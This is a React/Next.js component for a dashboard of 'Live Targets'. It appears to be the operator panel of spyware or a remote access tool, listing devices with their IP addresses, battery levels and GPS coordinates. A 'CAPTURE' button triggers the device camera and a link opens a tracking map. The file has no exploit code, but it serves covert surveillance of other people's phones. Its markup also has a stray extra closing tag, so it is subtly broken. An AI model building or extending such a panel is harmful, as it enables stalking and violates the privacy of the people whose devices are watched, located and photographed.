'use client';

import React, { useMemo, useState } from 'react';
import Link from 'next/link';
import { clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';
import {
  Search,
  Camera,
  MapPin,
  BatteryFull,
  BatteryMedium,
  BatteryLow,
  Circle,
  type LucideIcon,
} from 'lucide-react';
import { Target } from '@/types/target';

const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));

const getBatteryState = (battery?: number) => {
  if (typeof battery !== 'number') {
    return { icon: BatteryLow, color: 'text-slate-500', label: 'Unknown' };
  }

  if (battery > 50) {
    return { icon: BatteryFull, color: 'text-emerald-400', label: 'High' };
  }

  if (battery >= 20) {
    return { icon: BatteryMedium, color: 'text-amber-400', label: 'Medium' };
  }

  return { icon: BatteryLow, color: 'text-rose-400', label: 'Low' };
};

interface TargetListProps {
  targets: Target[];
  selectedTargetId?: string;
  loading: boolean;
  busyTargetId?: string | null;
  onSelect: (deviceId: string) => void;
  onCapture: (deviceId: string) => void;
}

export default function TargetList({
  targets,
  selectedTargetId,
  loading,
  busyTargetId,
  onSelect,
  onCapture,
}: TargetListProps) {
  const [searchTerm, setSearchTerm] = useState('');

  const filteredTargets = useMemo(() => {
    const term = searchTerm.toLowerCase().trim();
    return targets.filter((target) => {
      return !term ||
        target.id?.toLowerCase().includes(term) ||
        (target.deviceInfo?.model || target.model || '').toLowerCase().includes(term);
    });
  }, [searchTerm, targets]);

  return (
    <div className="space-y-6">
      {/* ── Header + Search ── */}
      <div className="hybrid-card p-5">
        <div className="flex flex-col gap-6 lg:flex-row lg:items-center lg:justify-between">
          <div>
            <h2 className="text-xl font-bold text-[#f7f8f8] tracking-[-0.04em]">Live Targets</h2>
            <p className="text-[11px] text-[#8a8f98] font-mono mt-1 uppercase tracking-widest">
              {loading ? 'SYNCING...' : `STREAMS: ${filteredTargets.length} ACTIVE`}
            </p>
          </div>

          <div className="w-full max-w-xs">
            <label className="relative block">
              <Search size={14} className="pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-[#8a8f98]" />
              <input
                type="text"
                value={searchTerm}
                onChange={(event) => setSearchTerm(event.target.value)}
                placeholder="Filter system ID..."
                className="w-full rounded-lg border border-[#23252a] bg-[#010102] py-2.5 pl-10 pr-4 text-sm text-[#f7f8f8] outline-none transition placeholder:text-[#62666d] focus:border-emerald-500/50 focus:ring-1 focus:ring-emerald-500/20 font-mono"
              />
            </label>
          </div>
        </div>
      </div>

      {/* ── Device Grid ── */}
        {loading ? (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[...Array(4)].map((_, i) => (
              <div key={i} className="hybrid-card p-4 animate-pulse h-44 bg-[#0f1011]" />
            ))}
          </div>
        ) : filteredTargets.length === 0 ? (
          <div className="py-20 text-center text-[#8a8f98]">
            <p className="text-sm font-mono tracking-widest uppercase">Null pointer exception: No matches</p>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filteredTargets.map((target) => {
              const isOnline = target.status?.toUpperCase() === 'ONLINE';
              const batteryState = getBatteryState(target.battery);
              const BatteryIcon = batteryState.icon as LucideIcon;
              const targetIp = target.deviceInfo?.ip || target.ip || '0.0.0.0';
              const deviceModel = target.deviceInfo?.model || target.model || 'Unknown';
              const manufacturer = target.deviceInfo?.manufacturer || '';

              return (
                <div
                  key={target.id}
                  onClick={() => onSelect(target.id)}
                  className={cn(
                    'hybrid-card p-5 group cursor-pointer',
                    target.id === selectedTargetId
                      ? 'border-emerald-500/40 bg-[#141516] accent-glow'
                      : 'hover:bg-[#141516]'
                  )}
                >
                  {/* Header */}
                  <div className="flex items-start justify-between mb-4">
                    <div className="flex-1 min-w-0">
                      <h4 className="text-sm font-bold text-[#f7f8f8] truncate tracking-tight">
                        {manufacturer} {deviceModel}
                      </h4>
                      <p className="text-[10px] text-[#8a8f98] font-mono mt-1 truncate uppercase tracking-tighter">ID: {target.id}</p>
                    </div>
                    <div className={cn(
                      'flex items-center justify-center w-8 h-8 rounded-md shrink-0 ml-2 border transition-colors',
                      isOnline
                        ? 'bg-emerald-500/10 border-emerald-500/20 accent-glow'
                        : 'bg-[#18191a] border-[#23252a]'
                    )}>
                      <Circle
                        size={6}
                        className={isOnline ? 'text-emerald-400 hacker-flicker' : 'text-[#62666d]'}
                        fill="currentColor"
                      />
                    </div>
                  </div>

                  {/* Info rows */}
                  <div className="space-y-2 mb-3">
                    <InfoRow label="Status" value={isOnline ? 'ONLINE' : 'OFFLINE'} valueClass={isOnline ? 'text-emerald-400' : 'text-red-400'} />
                    <InfoRow
                      label="Battery"
                      value={typeof target.battery === 'number' ? `${target.battery}%` : 'N/A'}
                      valueClass={batteryState.color}
                      icon={<BatteryIcon size={12} className={batteryState.color} />}
                    />
                    <InfoRow label="IP" value={targetIp} valueClass="text-slate-300" />
                  </div>

                  {/* Location */}
                  {target.location?.lat && (
                    <div className="mb-3 p-2 rounded-lg bg-white/[0.02] border border-white/[0.04]">
                      <p className="text-[10px] text-slate-500 mb-0.5">📍 Location</p>
                      <p className="text-[10px] text-slate-400 font-mono">
                        {target.location.lat.toFixed(4)}, {target.location.lng?.toFixed(4)}
                      </p>
                    </div>
                  )}

                  {/* Actions */}
                  <div className="flex gap-2 pt-4 border-t border-[#23252a]">
                    <button
                      type="button"
                      onClick={(event) => {
                        event.stopPropagation();
                        onCapture(target.id);
                      }}
                      disabled={busyTargetId === target.id}
                      className={cn(
                        'flex-1 inline-flex items-center justify-center gap-1.5 rounded-lg border px-3 py-2 text-[11px] font-bold transition-all uppercase tracking-wider font-mono',
                        'border-emerald-500/30 bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 accent-glow',
                        busyTargetId === target.id && 'cursor-not-allowed opacity-50'
                      )}
                    >
                      <Camera size={12} />
                      {busyTargetId === target.id ? 'PENDING...' : 'CAPTURE'}
                    </button>
                    <Link
                      href={`/dashboard/map/${target.id}`}
                      onClick={(event) => event.stopPropagation()}
                      className="inline-flex items-center justify-center rounded-lg border border-[#34343a] bg-[#18191a] px-3 py-2 text-[#f7f8f8] transition-all hover:bg-[#191a1b] hover:border-[#3e3e44]"
                    >
                      <MapPin size={12} />
                    </Link>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}

/* ── Inline helper ── */
function InfoRow({ label, value, valueClass, icon }: { label: string; value: string; valueClass: string; icon?: React.ReactNode }) {
  return (
    <div className="flex items-center justify-between">
      <span className="text-[11px] text-slate-500">{label}</span>
      <div className="flex items-center gap-1.5">
        {icon}
        <span className={cn('text-[11px] font-mono font-semibold', valueClass)}>
          {value}
        </span>
      </div>
    </div>
  );
}
